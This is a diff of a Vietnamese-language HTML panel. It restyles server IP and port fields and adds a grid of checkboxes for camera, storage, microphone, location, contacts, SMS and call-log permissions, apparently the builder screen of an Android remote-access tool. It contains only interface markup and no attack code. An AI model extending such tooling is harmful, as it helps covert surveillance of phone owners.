@@ -130,7 +130,7 @@
     <body>
         <div class="page-wrap">
             <!-- GRID -->
-            <div class="ui stackable column grid">
+            <div class="ui stackable two column grid">
                 <!-- Left -->
                 <div class="column">
                     <div class="section-card">
@@ -146,8 +146,7 @@
                                 <!-- IP -->
                                 <div class="field">
                                     <label>
-                                        <i class="fas fa-globe" style="margin-right:6px"></i>
-                                        Server IP
+                                        <i class="fas fa-globe" style="margin-right:6px"></i> Server IP
                                     </label>
                                     <div class="ui left icon input">
                                         <input
@@ -158,18 +157,16 @@
                                             pattern="^((25[0-5]|2[0-4]\d|[01]?\d?\d)(\.|$)){4}"
                                             aria-label="Địa chỉ IP máy chủ"
                                         >
-                                        <i class="fas fa-network-wired icon" style="color: #ffffff;"></i>
+                                        <i class="fas fa-network-wired icon"></i>
                                     </div>
-                                    <div class="hint">
-                                        Định dạng IPv4, ví dụ:
+                                    <div class="hint">Định dạng IPv4, ví dụ:
                                         <b>188.132.150.10</b>
                                     </div>
                                 </div>
                                 <!-- PORT -->
                                 <div class="field">
                                     <label>
-                                        <i class="fas fa-plug" style="margin-right:6px;"></i>
-                                        Server Port
+                                        <i class="fas fa-plug" style="margin-right:6px"></i> Server Port
                                     </label>
                                     <div class="ui left icon input">
                                         <input
@@ -177,29 +174,102 @@
                                             type="number"
                                             min="1025"
                                             max="65535"
-                                            placeholder="Mặc định 9094"
+                                            placeholder="mặc định 9094"
                                             aria-label="Cổng máy chủ"
                                         >
-                                        <i class="fas fa-terminal icon" style="color: #ffffff;"></i>
+                                        <i class="fas fa-terminal icon"></i>
                                     </div>
-                                    <div class="hint">
-                                        Khoảng hợp lệ: 1025–65535. Mặc định:
+                                    <div class="hint">Khoảng hợp lệ: 1025–65535. Mặc định:
                                         <b>9094</b>
                                     </div>
                                 </div>
                             </div>
                             <div class="soft-divider"></div>
                             <!-- Quick actions -->
-                            <div class="ui small buttons" style="display: flex; justify-content: flex-start; gap: 4px; align-items: center;">
+                            <div class="ui small buttons">
                                 <button class="ui button basic" ng-click="srcIP='127.0.0.1'">
-                                    <i class="fa-solid fa-bolt"></i>
-                                    Localhost
+                                    <i class="fa-solid fa-bolt"></i> Localhost
                                 </button>
                                 <button class="ui button basic" ng-click="srcPort=9094">
-                                    <i class="fa-solid fa-rotate"></i>
-                                    Dùng cổng mặc định
+                                    <i class="fa-solid fa-rotate"></i> Dùng cổng mặc định
                                 </button>
                             </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Right -->
+                <div class="column">
+                    <div class="section-card">
+                        <div class="section-title">
+                            <span class="title-icon" style="background: rgba(138,180,255,.12); border-color: rgba(138,180,255,.25); color: var(--accent);">
+                                <i class="fa-solid fa-shield-halved"></i>
+                            </span>
+                            <span>Quyền tùy chỉnh</span>
+                            <span class="badge">Permissions</span>
+                        </div>
+                        <div class="perm-grid">
+                            <!-- Each item keeps the original IDs/values -->
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input
+                                        type="checkbox"
+                                        id="Permissions1"
+                                        value="CameraPer"
+                                        class="settings icon"
+                                    >
+                                    <label for="Permissions1">
+                                        <i class="fas fa-camera"></i> Camera
+                                    </label>
+                                </div>
+                            </label>
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input type="checkbox" id="Permissions2" value="StoragePer">
+                                    <label for="Permissions2">
+                                        <i class="fas fa-folder-open"></i> Bộ nhớ máy
+                                    </label>
+                                </div>
+                            </label>
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input type="checkbox" id="Permissions3" value="MicPer">
+                                    <label for="Permissions3">
+                                        <i class="fas fa-microphone"></i> Micro
+                                    </label>
+                                </div>
+                            </label>
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input type="checkbox" id="Permissions4" value="LocationPer">
+                                    <label for="Permissions4">
+                                        <i class="fas fa-location-dot"></i> Vị trí
+                                    </label>
+                                </div>
+                            </label>
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input type="checkbox" id="Permissions5" value="ContactsPer">
+                                    <label for="Permissions5">
+                                        <i class="fas fa-address-book"></i> Danh bạ
+                                    </label>
+                                </div>
+                            </label>
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input type="checkbox" id="Permissions6" value="SMSPer">
+                                    <label for="Permissions6">
+                                        <i class="fas fa-comment-dots"></i> SMS
+                                    </label>
+                                </div>
+                            </label>
+                            <label class="permission-box">
+                                <div class="ui checkbox">
+                                    <input type="checkbox" id="Permissions7" value="CallsLogsPer">
+                                    <label for="Permissions7">
+                                        <i class="fas fa-phone"></i> Nhật ký cuộc gọi
+                                    </label>
+                                </div>
+                            </label>
                         </div>
                     </div>
                 </div>
